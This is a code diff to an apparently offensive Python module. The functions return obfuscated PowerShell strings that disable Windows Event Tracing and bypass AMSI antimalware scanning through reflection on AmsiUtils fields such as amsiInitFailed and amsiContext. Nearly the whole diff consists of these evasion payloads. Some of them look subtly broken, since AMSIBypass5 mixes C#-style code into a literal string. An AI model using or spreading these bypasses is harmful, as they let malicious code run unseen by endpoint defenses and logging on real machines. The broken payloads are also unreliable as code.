@@ -28,7 +28,9 @@ def scriptBlockLogBypass():
 
 def ETWBypass():
     #tandasat killetw.ps1
-    bypass = "[System.Diagnostics.Eventing.EventProvider].\"GetFie`ld\"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider').\"GetFie`ld\"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);"
+    bypass = """
+    [System.Diagnostics.Eventing.EventProvider]."GetFie`ld"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider')."GetFie`ld"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);
+    """
     return bypass
 
 def AMSIBypass():
@@ -75,5 +77,31 @@ def AMSIBypass2():
     bypass = bypass.replace('"@','"')
     bypass = bypass.replace('\n','')
     bypass = bypass.replace('    ', '')
+    
+    return bypass
+
+def AMSIBypass3():
+    # Forcing error
+    bypass = """
+    $var = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
+    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);
+    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$var);;
+    """
+
+    return bypass
+
+def AMSIBypass4():
+    # Using Matt Graebers Reflection method with WMF5 autologging bypass
+    bypass = """
+    [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
+    """
+
+    return bypass
+
+def AMSIBypass5():
+    # Using Matt Graebers second Reflection method
+    bypass = """
+    [Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
+    """
     
     return bypass
